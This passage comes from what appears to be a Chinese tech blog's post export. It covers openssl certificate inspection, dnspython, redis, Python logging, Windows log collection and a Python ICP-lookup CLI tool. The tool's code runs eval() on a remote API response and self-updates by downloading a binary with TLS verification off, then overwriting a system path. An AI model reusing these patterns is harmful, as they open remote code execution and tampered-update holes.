eWluZyBQYXJ0aWVzIGFuZCBvbmx5IGluIGFjY29yZGFuY2Ugd2l0aCB0aGUgQ2Vy dGlmaWNhdGUgUG9saWN5IGZvdW5kIGF0IGh0dHBzOi8vbGV0c2VuY3J5cHQub3Jn L3JlcG9zaXRvcnkvMA0GCSqGSIb3DQEBCwUAA4IBAQAM74q3r2wOgyAfcg1atlgz MChtVGaKTllk4tdS8OJKzhIFBR77NG7gHd1lzs/yQr4l3WYv4T2T5+Ayp4c95fvb uWqMsrD3sL30MBhqCeXdccJlckWUfsejmUOEAzyqtscAtrIw3ksQLOmlibf326TJ sIMV+oHsg9arSHUj2Z4hzMDxbH2jl+6J3HlszPmufUS2HRRMD9KGJFUECsmPnD+w dUeBLOlcuNwcClH0KCHgqJcO+ZDGTk/hvbYNRGnpfVbJ/06MGEhKd+uKwurPy5sp +mTOh22TTsN0wqc177L0CGy7E9NMr/erhOuaiEOhgHEI5atyueZmlfHz/Xkv49yV -----END CERTIFICATE----- subject=/CN=awen.me issuer=/C=US/O=Let&apos;s Encrypt/CN=Let&apos;s Encrypt Authority X3 --- No client certificate CA names sent Peer signing digest: SHA512 Server Temp Key: ECDH, P-256, 256 bits --- SSL handshake has read 3148 bytes and written 433 bytes --- New, TLSv1/SSLv3, Cipher is ECDHE-RSA-AES128-GCM-SHA256 Server public key is 2048 bit Secure Renegotiation IS supported Compression: NONE Expansion: NONE No ALPN negotiated SSL-Session: Protocol : TLSv1.2 Cipher : ECDHE-RSA-AES128-GCM-SHA256 Session-ID: 07B2204FD14B558C10FD7B46FB671AA2773A7879E4D54EB6B87969AC0715817C Session-ID-ctx: Master-Key: A4CDEE832FED5CF7BC3EDBAF26F6656D50013C5B3D0F9180328E01055A4975ECF5DEB30EB7CBCD793743A5E5798CDF50 Key-Arg : None PSK identity: None PSK identity hint: None SRP username: None TLS session ticket lifetime hint: 86400 (seconds) TLS session ticket: 0000 - 04 b2 d5 29 64 26 3a 7e-6b 73 f7 51 59 05 2c ef ...)d&amp;:~ks.QY.,. 0010 - 6e 16 8c cd 04 bd b7 31-89 54 f0 93 36 98 92 ea n......1.T..6... 0020 - 89 5e 00 96 d4 04 09 4b-a6 a6 3b b0 73 24 45 40 .^.....K..;.s$E@ 0030 - a7 db c5 20 cd a0 72 c8-08 1b f9 a7 66 c6 64 a4 ... ..r.....f.d. 0040 - 05 42 c8 69 e9 19 1a 33-46 63 b1 6b 6b 82 56 01 .B.i...3Fc.kk.V. 0050 - 21 22 60 32 fd a3 af 58-77 8f f1 39 2b 44 f2 52 !&quot;`2...Xw..9+D.R 0060 - 6f 7e 93 80 19 8d a4 36-91 b3 c2 01 38 d3 6a 95 o~.....6....8.j. 0070 - fc 22 d5 77 9d 67 2a 84-7f 35 85 c7 a1 7d e8 13 .&quot;.w.g*..5...}.. 0080 - 8e 38 96 c4 2c a6 35 02-92 1c 05 07 ef 4c 4d 80 .8..,.5......LM. 0090 - fa cb 1b 3a 5b 15 f5 f0-46 ce 45 60 65 40 82 9f ...:[...F.E`e@.. 00a0 - f3 62 36 9c 00 ab c0 9f-db 77 b0 36 f0 24 b7 74 .b6......w.6.$.t Start Time: 1509693221 Timeout : 300 (sec) Verify return code: 0 (ok) --- SSL3 alert read:warning:close notify closed SSL3 alert write:warning:close notify提取证书 echo |\\openssl s_client -connect awen.me:443 2&gt;&amp;1|\\sed -ne &apos;/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/p&apos; &gt;&gt; awen.pem得到如下内容 ➜ Downloads cat awen.pem -----BEGIN CERTIFICATE----- MIIFDDCCA/SgAwIBAgISA3pwr8utOg9I8/XTJ+8wdJTOMA0GCSqGSIb3DQEBCwUA MEoxCzAJBgNVBAYTAlVTMRYwFAYDVQQKEw1MZXQncyBFbmNyeXB0MSMwIQYDVQQD ExpMZXQncyBFbmNyeXB0IEF1dGhvcml0eSBYMzAeFw0xNzEwMTEwMDAzMzhaFw0x ODAxMDkwMDAzMzhaMBIxEDAOBgNVBAMTB2F3ZW4ubWUwggEiMA0GCSqGSIb3DQEB AQUAA4IBDwAwggEKAoIBAQCtCuIWnpHvn6Lm7twgUlkzy1v6j1tQ/yDxWyd8gvOk GJhLTlAepXdkLQsEw2QRpGxoOvsO28K9MH4B1baLGyl5TbNnZAFIUOrkDBMvaPFU FYXK2yqtdSfky9AD3LkSjRcDMspqm9tIqjBYyu78lomZR/AgcVePYPwYfONzaE8J 4NvCLneFI+fzifNuqpkUt18wpWBp/oVC1/ln74ShVmYczg9IqTX8vw58MWlBemIL OI40ExXDnOHa7ZdxFl1lKPtVjfQjR3bS84Dsj7XBqDYLe3tJNed0+kTJIgQFhshH kcpDpMPW78rDz/e1akA2o0Ry/WzAnf9dOJDfjvd7FsC1AgMBAAGjggIiMIICHjAO BgNVHQ8BAf8EBAMCBaAwHQYDVR0lBBYwFAYIKwYBBQUHAwEGCCsGAQUFBwMCMAwG A1UdEwEB/wQCMAAwHQYDVR0OBBYEFO1HBP+QqfO+dhvj5nr6vAr/mlOHMB8GA1Ud IwQYMBaAFKhKamMEfd265tE5t6ZFZe/zqOyhMG8GCCsGAQUFBwEBBGMwYTAuBggr BgEFBQcwAYYiaHR0cDovL29jc3AuaW50LXgzLmxldHNlbmNyeXB0Lm9yZzAvBggr BgEFBQcwAoYjaHR0cDovL2NlcnQuaW50LXgzLmxldHNlbmNyeXB0Lm9yZy8wLQYD VR0RBCYwJIIHYXdlbi5tZYIMZmlsZS5hd2VuLm1lggt3d3cuYXdlbi5tZTCB/gYD VR0gBIH2MIHzMAgGBmeBDAECATCB5gYLKwYBBAGC3xMBAQEwgdYwJgYIKwYBBQUH AgEWGmh0dHA6Ly9jcHMubGV0c2VuY3J5cHQub3JnMIGrBggrBgEFBQcCAjCBngyB m1RoaXMgQ2VydGlmaWNhdGUgbWF5IG9ubHkgYmUgcmVsaWVkIHVwb24gYnkgUmVs eWluZyBQYXJ0aWVzIGFuZCBvbmx5IGluIGFjY29yZGFuY2Ugd2l0aCB0aGUgQ2Vy dGlmaWNhdGUgUG9saWN5IGZvdW5kIGF0IGh0dHBzOi8vbGV0c2VuY3J5cHQub3Jn L3JlcG9zaXRvcnkvMA0GCSqGSIb3DQEBCwUAA4IBAQAM74q3r2wOgyAfcg1atlgz MChtVGaKTllk4tdS8OJKzhIFBR77NG7gHd1lzs/yQr4l3WYv4T2T5+Ayp4c95fvb uWqMsrD3sL30MBhqCeXdccJlckWUfsejmUOEAzyqtscAtrIw3ksQLOmlibf326TJ sIMV+oHsg9arSHUj2Z4hzMDxbH2jl+6J3HlszPmufUS2HRRMD9KGJFUECsmPnD+w dUeBLOlcuNwcClH0KCHgqJcO+ZDGTk/hvbYNRGnpfVbJ/06MGEhKd+uKwurPy5sp +mTOh22TTsN0wqc177L0CGy7E9NMr/erhOuaiEOhgHEI5atyueZmlfHz/Xkv49yV -----END CERTIFICATE-----查看证书信息 ➜ Downloads openssl x509 -noout -text -in awen.pem Certificate: Data: Version: 3 (0x2) Serial Number: 03:7a:70:af:cb:ad:3a:0f:48:f3:f5:d3:27:ef:30:74:94:ce Signature Algorithm: sha256WithRSAEncryption Issuer: C=US, O=Let&apos;s Encrypt, CN=Let&apos;s Encrypt Authority X3 Validity Not Before: Oct 11 00:03:38 2017 GMT Not After : Jan 9 00:03:38 2018 GMT Subject: CN=awen.me Subject Public Key Info: Public Key Algorithm: rsaEncryption Public-Key: (2048 bit) Modulus: 00:ad:0a:e2:16:9e:91:ef:9f:a2:e6:ee:dc:20:52: 59:33:cb:5b:fa:8f:5b:50:ff:20:f1:5b:27:7c:82: f3:a4:18:98:4b:4e:50:1e:a5:77:64:2d:0b:04:c3: 64:11:a4:6c:68:3a:fb:0e:db:c2:bd:30:7e:01:d5: b6:8b:1b:29:79:4d:b3:67:64:01:48:50:ea:e4:0c: 13:2f:68:f1:54:15:85:ca:db:2a:ad:75:27:e4:cb: d0:03:dc:b9:12:8d:17:03:32:ca:6a:9b:db:48:aa: 30:58:ca:ee:fc:96:89:99:47:f0:20:71:57:8f:60: fc:18:7c:e3:73:68:4f:09:e0:db:c2:2e:77:85:23: e7:f3:89:f3:6e:aa:99:14:b7:5f:30:a5:60:69:fe: 85:42:d7:f9:67:ef:84:a1:56:66:1c:ce:0f:48:a9: 35:fc:bf:0e:7c:31:69:41:7a:62:0b:38:8e:34:13: 15:c3:9c:e1:da:ed:97:71:16:5d:65:28:fb:55:8d: f4:23:47:76:d2:f3:80:ec:8f:b5:c1:a8:36:0b:7b: 7b:49:35:e7:74:fa:44:c9:22:04:05:86:c8:47:91: ca:43:a4:c3:d6:ef:ca:c3:cf:f7:b5:6a:40:36:a3: 44:72:fd:6c:c0:9d:ff:5d:38:90:df:8e:f7:7b:16: c0:b5 Exponent: 65537 (0x10001) X509v3 extensions: X509v3 Key Usage: critical Digital Signature, Key Encipherment X509v3 Extended Key Usage: TLS Web Server Authentication, TLS Web Client Authentication X509v3 Basic Constraints: critical CA:FALSE X509v3 Subject Key Identifier: ED:47:04:FF:90:A9:F3:BE:76:1B:E3:E6:7A:FA:BC:0A:FF:9A:53:87 X509v3 Authority Key Identifier: keyid:A8:4A:6A:63:04:7D:DD:BA:E6:D1:39:B7:A6:45:65:EF:F3:A8:EC:A1 Authority Information Access: OCSP - URI:http://ocsp.int-x3.letsencrypt.org CA Issuers - URI:http://cert.int-x3.letsencrypt.org/ X509v3 Subject Alternative Name: DNS:awen.me, DNS:file.awen.me, DNS:www.awen.me X509v3 Certificate Policies: Policy: 2.23.140.1.2.1 Policy: 1.3.6.1.4.1.44947.1.1.1 CPS: http://cps.letsencrypt.org User Notice: Explicit Text: This Certificate may only be relied upon by Relying Parties and only in accordance with the Certificate Policy found at https://letsencrypt.org/repository/ Signature Algorithm: sha256WithRSAEncryption 0c:ef:8a:b7:af:6c:0e:83:20:1f:72:0d:5a:b6:58:33:30:28: 6d:54:66:8a:4e:59:64:e2:d7:52:f0:e2:4a:ce:12:05:05:1e: fb:34:6e:e0:1d:dd:65:ce:cf:f2:42:be:25:dd:66:2f:e1:3d: 93:e7:e0:32:a7:87:3d:e5:fb:db:b9:6a:8c:b2:b0:f7:b0:bd: f4:30:18:6a:09:e5:dd:71:c2:65:72:45:94:7e:c7:a3:99:43: 84:03:3c:aa:b6:c7:00:b6:b2:30:de:4b:10:2c:e9:a5:89:b7: f7:db:a4:c9:b0:83:15:fa:81:ec:83:d6:ab:48:75:23:d9:9e: 21:cc:c0:f1:6c:7d:a3:97:ee:89:dc:79:6c:cc:f9:ae:7d:44: b6:1d:14:4c:0f:d2:86:24:55:04:0a:c9:8f:9c:3f:b0:75:47: 81:2c:e9:5c:b8:dc:1c:0a:51:f4:28:21:e0:a8:97:0e:f9:90: c6:4e:4f:e1:bd:b6:0d:44:69:e9:7d:56:c9:ff:4e:8c:18:48: 4a:77:eb:8a:c2:ea:cf:cb:9b:29:fa:64:ce:87:6d:93:4e:c3: 74:c2:a7:35:ef:b2:f4:08:6c:bb:13:d3:4c:af:f7:ab:84:eb: 9a:88:43:a1:80:71:08:e5:ab:72:b9:e6:66:95:f1:f3:fd:79: 2f:e3:dc:95显示证书信息 openssl s_client -connect www.alipay.com:443 -showcerts","categories":[],"tags":[{"name":"openssl","slug":"openssl","permalink":"https://awen.me/tags/openssl/"}]},{"title":"使用dnspython 模块解析域名","slug":"使用dnspython-模块解析域名","date":"2017-11-02T11:30:32.000Z","updated":"2021-02-26T06:05:29.309Z","comments":true,"path":"posts/54469.html","link":"","permalink":"https://awen.me/posts/54469.html","excerpt":"python 的 dnspython 模块，可以用来对域名进行诸如 A 记录、MX 记录、CNAME 记录等解析操作。","text":"python 的 dnspython 模块，可以用来对域名进行诸如 A 记录、MX 记录、CNAME 记录等解析操作。 # 安装 python3 安装 pip3 install dnspython3python2 安装 pip install dnspython使用查询A 记录 IP #!/usr/bin/python3 #-*_coding:utf-8-*- import dns.resolver def dnsresolver(domain): try: domain = dns.resolver.query(domain,&quot;A&quot;) for domain in domain.response.answer: for ip in domain.items: if ip.rdtype == 1: print(&quot;该域名解析的IP地址是:&quot;+ip.address) else: pass except: print(&quot;解析错误:域名参数不正确&quot;) dnsresolver(&apos;www.baidu.com&apos;)ß 和dig 查询的A记录地址是一样的 1.查询CNAME #!/usr/bin/python3 #-*_coding:utf-8-*- import dns.resolver def dnsresolver(domain): try: domain = dns.resolver.query(domain,&quot;CNAME&quot;) for domain in domain.response.answer: for ip in domain.items: #rdtype 为1 表示是A记录 print(&quot;该域名解析的IP地址是:&quot;+ip.to_text()) except: print(&quot;解析错误:域名参数不正确&quot;) dnsresolver(&apos;fileawenme.b0.aicdn.com&apos;)执行结果 ➜ Downloads python3 dnsdemo.py 该域名解析的IP地址是:nm.ctn.aicdn.com.","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://awen.me/tags/python/"}]},{"title":"python 操作redis","slug":"python-操作redis","date":"2017-11-02T06:07:07.000Z","updated":"2021-02-26T06:05:29.284Z","comments":true,"path":"posts/19246.html","link":"","permalink":"https://awen.me/posts/19246.html","excerpt":"安装pip3 install redis 导入import redis建立连接池","text":"安装pip3 install redis 导入import redis建立连接池 pool = redis.ConnectionPool(host=&apos;&apos;, port=, db=0, password=&apos;&apos;,socket_connect_timeout=10,socket_timeout=10,decode_responses=True) redis_connect = redis.Redis(connection_pool = pool) 注意，如获取的数据是utf-8的，必须加 ecode_responses=True ，否则需要自行转码 插入数据redis_connect.set(key,value)获取数据get_value = redis_connect.get(key)设置缓存过期时间redis_connect.expire(key,604800)","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://awen.me/tags/python/"}]},{"title":"python 的logging 模块","slug":"python-的logging-模块","date":"2017-11-02T05:54:00.000Z","updated":"2021-02-26T06:05:29.285Z","comments":true,"path":"posts/61599.html","link":"","permalink":"https://awen.me/posts/61599.html","excerpt":"在使用 python 的时候会经常出现一些日志输出，这些日志信息便于我们来进行问题的定位，但有时候，我们判断一些输出信息并不重要，不希望其输出，这个时候，我们可以自定义其日志级别来实现不输出信息。","text":"在使用 python 的时候会经常出现一些日志输出，这些日志信息便于我们来进行问题的定位，但有时候，我们判断一些输出信息并不重要，不希望其输出，这个时候，我们可以自定义其日志级别来实现不输出信息。 比如我在使用 tldextract 模块的时候就提示我 unable to cache TLDs in file /var/folders/v1/slqlcj696z9cpj31tbwzyly00000gn/T/_MEIhvCjxZ/tldextract/.tld_set: [Errno 2] No such file or directory: &apos;/var/folders/v1/slqlcj696z9cpj31tbwzyly00000gn/T/_MEIhvCjxZ/tldextract/.tld_set&apos;但是我认为这个输出对于我来说无关紧要，所以我可以这样设置 import logging logging.getLogger(&quot;tldextract&quot;).setLevel(logging.CRITICAL)python的日志级别分为 logging.debug(&apos;debug message&apos;) logging.info(&apos;info message&apos;) logging.warn(&apos;warn message&apos;) logging.error(&apos;error message&apos;) logging.critical(&apos;critical message&apos;)日志级别 级别 何时使用 DEBUG 详细信息，典型地调试问题时会感兴趣。 INFO 证明事情按预期工作。 WARNING 表明发生了一些意外，或者不久的将来会发生问题（如‘磁盘满了’）。软件还是在正常工作。 ERROR 由于更严重的问题，软件已不能执行一些功能了。 CRITICAL 严重错误，表明软件已不能继续运行了。","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://awen.me/tags/python/"}]},{"title":"聊一聊redis的安全性","slug":"聊一聊redis的安全性","date":"2017-11-01T11:26:30.000Z","updated":"2021-02-26T06:05:29.353Z","comments":true,"path":"posts/29574.html","link":"","permalink":"https://awen.me/posts/29574.html","excerpt":"redis 传输数据完全是明文传输，哪怕是设置了密码。 因为redis是以牺牲安全来提高速度的。所以要保障redis的安全，需要做的是：","text":"redis 传输数据完全是明文传输，哪怕是设置了密码。 因为redis是以牺牲安全来提高速度的。所以要保障redis的安全，需要做的是： 1.尽量避免公网直接访问，公网非常不安全。2.密码尽量长，因为redis的速度非常快，所以被人恶意暴力破解，处理速度也是很快的。3.修改默认端口，做好权限隔离。","categories":[],"tags":[{"name":"redis","slug":"redis","permalink":"https://awen.me/tags/redis/"}]},{"title":"如何收集 Windows 日志","slug":"如何收集-Windows-日志","date":"2017-10-29T05:10:21.000Z","updated":"2021-02-26T06:05:29.328Z","comments":true,"path":"posts/48427.html","link":"","permalink":"https://awen.me/posts/48427.html","excerpt":"在 Windows 操作系统出现故障时候，我们可以收集系统日志进行分析，具体操作步骤如下 收集 Windows 事件信息 使用快捷键win+R运行eventvwr.msc来打开事件查看器窗口","text":"在 Windows 操作系统出现故障时候，我们可以收集系统日志进行分析，具体操作步骤如下 收集 Windows 事件信息 使用快捷键win+R运行eventvwr.msc来打开事件查看器窗口 选择Windows日志-&gt;系统，点击右键，选择将所有事件另存为，保存为sys_events.evtx文件： 收集系统日志打开终端 输入 systeminfo &gt; systeminfo.log 然后提取的日志在 CMD 的当前目录下 收集蓝屏产生的dmp文件1.进入%SystemRoot%文件夹，查找是否有MEMORY.DMP文件，如果有，请收集；如果没有，请跳过。2.进入%SystemRoot%\\Minidump文件夹，查找是否有形如“061917-3500-01.dmp”文件，如果有，请全部收集；如果没有，请跳过。 请确保系统 dump 文件开启，计算机右键—高级–启动和故障恢复–设置–写入调试信息–转储文件如图所示配置即可。 将以上信息收集好后反馈给我们。","categories":[],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://awen.me/tags/Windows/"}]},{"title":"Mac 小技巧:launcpad 图标整理","slug":"Mac-小技巧-launcpad-图标整理","date":"2017-10-28T00:08:17.000Z","updated":"2021-02-26T06:05:29.259Z","comments":true,"path":"posts/32667.html","link":"","permalink":"https://awen.me/posts/32667.html","excerpt":"","text":"有时候，我们清理了系统的一些 APP 后，mac的 launchpad 图标就空出了很多，怎么整理呢？执行 defaults write com.apple.dock ResetLaunchPad -bool true; killall Dock即可。","categories":[],"tags":[{"name":"mac","slug":"mac","permalink":"https://awen.me/tags/mac/"}]},{"title":"快速查询备案的命令行小工具","slug":"快速查询备案的命令行小工具","date":"2017-10-27T12:15:41.000Z","updated":"2021-02-26T06:05:29.334Z","comments":true,"path":"posts/37786.html","link":"","permalink":"https://awen.me/posts/37786.html","excerpt":"你是否遇到过这样的问题，登录工信部网站查询备案，网站一直提示验证码错误,明明验证码是对的，却一直还提示错误。","text":"你是否遇到过这样的问题，登录工信部网站查询备案，网站一直提示验证码错误,明明验证码是对的，却一直还提示错误。 看看网友的吐槽吧！ 至少我很少能在 Chrome、火狐这样的浏览器查询成功，验证码一直错， IE ？IE 对于我来说是用来下载其他浏览器的工具。 此外，查询时需要打开浏览器—找到工信部站点—-输入域名—输入验证码-查询。是不是步骤有点多？在加上个验证码一直出错。我已经恨透了这个网站了。 但是这样的需求又很频繁，因为工作需要，会经常对客户的域名进行检查，并且我习惯于在命令行下工作，命令行对于我来说可以快速提升效率。于是自己写个脚本去快速实时的获取备案信息。 最开始的时候我在网上找了带缓存的 API 接口，查询结果不是实时的，不太准确，有的备案信息已经下掉了还是能查到，有的已经备案了却又查不到，于是，付费买了个接口，如果你也有类似需求，可以去类似于聚合数据、NowAPI 这样的专门做数据的网站去购买接口实现，比如聚合数据是99块钱2000次，NowAPI 是0.015一次请求。查询次数不是很多或者你恰好也这块需求的不妨试试。 下面是我写的代码，基于 Python3实现。 更新内容2017-11-1 1.加了redis 做了一层缓存，缓存7天，因为是付费接口，这样可以省点钱。 2017-10-31 1.增加了查询 IP 地址归属的功能。2.增加了更新程序的功能，使用 -u 参数可查找是否有更新。3.支持查询 IP 地址归属地。 2017-10-30 1.支持带 url 的链接自动解析主域名。2.支持 Windows 、Linux 、mac系统。3.基于实时的备案数据库，与工信部查询结果完全一致。 下载地址使用方法1.将下载的文件重命名未 ba，Windows 命名为 ba.exe 2.mac 和 Linux 将文件拷贝到 /usr/local/bin 下，并赋予其可执行权限 chmod +x /usr/local/bin/baWindows 系统将文件拷贝到 C:\\Windows 目录下 使用 1.查询域名 ➜ ~ ba -d www.youku.com 正在查询域名:youku.com &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[100%] =================================== 该域名备案状态:已备案 备案号:京ICP备06050721号-1 备案类型:企业 备案单位:合一信息技术（北京）有限公司 备案时间:2017-08-29 00:00:00 =================================== 2.查询带 URL的域名 ➜ ~ ba -d https://awen.me/post/48427.html 正在查询域名:awen.me &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[100%] =================================== 该域名备案状态:已备案 备案号:浙ICP备15018780号-3 备案类型:个人 备案单位:方文俊 备案时间:2016-12-14 00:00:00 =================================== 3.查询 IP 地址 ➜ ~ ba 这是一个提升工作效率的小工具 usage: ba [-h] [-d DOMAIN] [-v] [-i IP] [-a] [-u] optional arguments: -h, --help show this help message and exit -d DOMAIN, --domain DOMAIN 指定需要查询的域名，例如: ba -d awen.me -v, --version 显示版本信息 -i IP, --ip IP 查询 IP 归属地，例如 ba -i 123.234.1.1 -a, --auth 显示作者信息 -u, --update 升级程序 ? ~ ba -i 121.42.148.64 正在查询 IP 归属:121.42.148.64 &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[100%] =================================== 所在国家:中国 所在省份:山东 所在市区:青岛 所在县区: 所属运营商:阿里云/电信/联通/移动/铁通/教育网 ===================================4.更新程序 ➜ ~ sudo ba -u 没有可用更新代码 #!/usr/bin/python3 # -*- coding: UTF-8 -*- import time import re import platform import os,sys, stat import ast import json try: import requests import argparse import tldextract import redis from termcolor import * except Exception as e: print(&quot;请先安装 requests argparse tldextract redis&quot;) # 程序版本 VERSION = &quot;1.3&quot; # debug 开关 sys.stderr = None # 判断 IP 地址 def isIP(str): p = re.compile(&apos;^((25[0-5]|2[0-4]\\d|[01]?\\d\\d?)\\.){3}(25[0-5]|2[0-4]\\d|[01]?\\d\\d?)$&apos;) if p.match(str): return True else: return False # 查询 IP 地址 def query_ip(ip): api = &quot;http://freeapi.ipip.net/&quot;+ip try: headers = {&quot;User-Agent&quot;:&apos;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36&apos;,&apos;cache-control&apos;:&apos;no-cache&apos;} r = requests.get(api,headers=headers) except (requests.ConnectionError, IndexError, UnicodeEncodeError, TimeoutError): print(&quot;请求异常，无法连接服务器&quot;) except requests.HTTPError as f: print(&apos;请求异常，HTTP错误&apos;) finally: r.encoding = &apos;UTF-8&apos; r = eval(r.text) print(&quot;所在国家:&quot; + r[0]) print(&quot;所在省份:&quot; + r[1]) print(&quot;所在市区:&quot; + r[2]) print(&quot;所在县区:&quot; + r[3]) print(&quot;所属运营商:&quot; + r[4]) # 查询域名备案,先查缓存，如果没有，则去线上查，然后返回 def req(domain): redis_connect = redis.Redis(host=&apos;&apos;, port=, db=0, password=&apos;&apos;) get_value = redis_connect.get(domain) if get_value == None: api = &quot;https://api.awen.me&quot; payload = {&quot;app&quot;:&quot;domain.beian&quot;,&quot;domain&quot;:domain,&quot;appkey&quot;:&quot;&quot;,&quot;sign&quot;:&quot;&quot;,&quot;format&quot;:&quot;json&quot;} headers = {&quot;User-Agent&quot;:&apos;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36&apos;,&apos;cache-control&apos;:&apos;no-cache&apos;} try: r = requests.get(api,headers=headers,params=payload) except (requests.ConnectionError, IndexError, UnicodeEncodeError, TimeoutError): print(&quot;请求异常，无法连接服务器&quot;) except requests.HTTPError as f: print(&apos;请求异常，HTTP错误&apos;) finally: info = r.json() info = str(info) if r.status_code == 200: redis_connect.set(domain,info) redis_connect.expire(domain,604800) get_value = redis_connect.get(domain) get_value = get_value.decode(&apos;utf-8&apos;) info = ast.literal_eval(get_value) if info[&quot;result&quot;][&quot;status&quot;] == &apos;NOT_BEIAN&apos;: print(&quot;该域名备案状态:&quot;+colored(&quot;未备案&quot;,&quot;red&quot;)) elif info[&quot;result&quot;][&quot;status&quot;] == &apos;ALREADY_BEIAN&apos;: print(&quot;该域名备案状态:&quot;+colored(&quot;已备案&quot;,&quot;green&quot;)) print(&quot;备案号:&quot;+info[&quot;result&quot;][&quot;icpno&quot;]) print(&quot;备案类型:&quot; + info[&quot;result&quot;][&quot;organizers_type&quot;]) print(&quot;备案单位:&quot; + info[&quot;result&quot;][&quot;organizers&quot;]) print(&quot;备案时间:&quot; + info[&quot;result&quot;][&quot;exadate&quot;]) elif info[&quot;result&quot;][&quot;status&quot;] == &quot;WAIT_PROCESS&quot;: print(&quot;等待系统处理,预计10分钟内可完成&quot;) elif info[&quot;success&quot;] == &quot;0&quot;: print(&quot;系统错误&quot;) else: print(&quot;服务器异常&quot;) else: get_value = redis_connect.get(domain) get_value = redis_connect.get(domain) get_value = get_value.decode(&apos;utf-8&apos;) info = ast.literal_eval(get_value) if info[&quot;result&quot;][&quot;status&quot;] == &apos;NOT_BEIAN&apos;: print(&quot;该域名备案状态:&quot;+colored(&quot;未备案&quot;,&quot;red&quot;)) elif info[&quot;result&quot;][&quot;status&quot;] == &apos;ALREADY_BEIAN&apos;: print(&quot;该域名备案状态:&quot;+colored(&quot;已备案&quot;,&quot;green&quot;)) print(&quot;备案号:&quot;+info[&quot;result&quot;][&quot;icpno&quot;]) print(&quot;备案类型:&quot; + info[&quot;result&quot;][&quot;organizers_type&quot;]) print(&quot;备案单位:&quot; + info[&quot;result&quot;][&quot;organizers&quot;]) print(&quot;备案时间:&quot; + info[&quot;result&quot;][&quot;exadate&quot;]) elif info[&quot;result&quot;][&quot;status&quot;] == &quot;WAIT_PROCESS&quot;: print(&quot;等待系统处理,预计10分钟内可完成&quot;) elif info[&quot;success&quot;] == &quot;0&quot;: print(&quot;系统错误&quot;) def update(version): oldver = version newver = round((float(oldver)+0.1),2) osinfo = platform.system() version = str(newver) mac_url = &apos;&apos;+version linux_url = &apos;&apos;+version win_url = &apos;&apos;+version+&apos;.exe&apos; headers = {&quot;User-Agent&quot;:&apos;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36&apos;,&apos;cache-control&apos;:&apos;no-cache&apos;,&apos;referer&apos;:&apos;awen.me&apos;} if osinfo == &quot;Darwin&quot;: try: r = requests.get(mac_url,verify=False,stream=True,headers=headers) except (requests.ConnectionError, IndexError, UnicodeEncodeError, TimeoutError): print(&quot;请求异常，无法连接服务器&quot;) except requests.HTTPError as f: print(&apos;请求异常，HTTP错误&apos;) finally: if r.status_code == 200: os.remove(&apos;/usr/local/bin/ba&apos;) print(colored(&quot;正在下载更新&quot;,&quot;yellow&quot;)) plan() data = r.content with open(&apos;/usr/local/bin/ba&apos;, &apos;wb&apos;) as f: f.write(data) print(&quot;正在设置更新&quot;) os.popen(&apos;chmod 755 /usr/local/bin/ba&apos;) print(&quot;更新完成！&quot;) else: print(&quot;没有可用更新&quot;) if osinfo == &quot;Linux&quot;: try: r = requests.get(linux_url,verify=False,headers=headers) except (requests.ConnectionError, IndexError, UnicodeEncodeError, TimeoutError): print(&quot;请求异常，无法连接服务器&quot;) except requests.HTTPError as f: print(&apos;请求异常，HTTP错误&apos;) finally: if os.geteuid() == 0: if r.status_code == 200: os.remove(&apos;/usr/local/bin/ba&apos;) print(colored(&quot;正在下载更新&quot;,&quot;yellow&quot;)) plan() data = r.content with open(&apos;/usr/local/bin/ba&apos;, &apos;wb&apos;) as f: f.write(data) print(&quot;正在设置更新&quot;) os.system(&apos;chmod 755 /usr/local/bin/ba&apos;) print(&quot;更新完成！&quot;) else: print(&quot;没有可用更新&quot;) else: print(&quot;请使用 Root 权限执行&quot;) if osinfo == &quot;Windows&quot;: try: r = requests.get(win_url,verify=False,stream=True,headers=headers) except (requests.ConnectionError, IndexError, UnicodeEncodeError, TimeoutError): print(&quot;请求异常，无法连接服务器&quot;) except requests.HTTPError as f: print(&apos;请求异常，HTTP错误&apos;) finally: if r.status_code == 200: print(colored(&quot;正在下载更新&quot;,&quot;yellow&quot;)) plan() data = r.content with open(&apos;C:/Windows/ba.exe&apos;, &apos;wb&apos;) as f: f.write(data) print(&quot;正在设置更新&quot;) print(&quot;更新完成！&quot;) else: print(&quot;没有可用更新&quot;) # 进度条 def plan(): for i in range(100): k = i + 1 str = &apos;&gt;&apos;*(i//2)+&apos; &apos;*((100-k)//2) sys.stdout.write(&apos;\\r&apos;+str+&apos;[%s%%]&apos;%(i+1)) sys.stdout.flush() time.sleep(0.002) print(&quot;\\n&quot;) # 菜单 def menu(): if len(sys.argv) == 1: sys.argv.append(&apos;--help&apos;) APP_DESC = &quot;&quot;&quot; 这是一个提升工作效率的小工具 &quot;&quot;&quot; print(APP_DESC) parser = argparse.ArgumentParser() 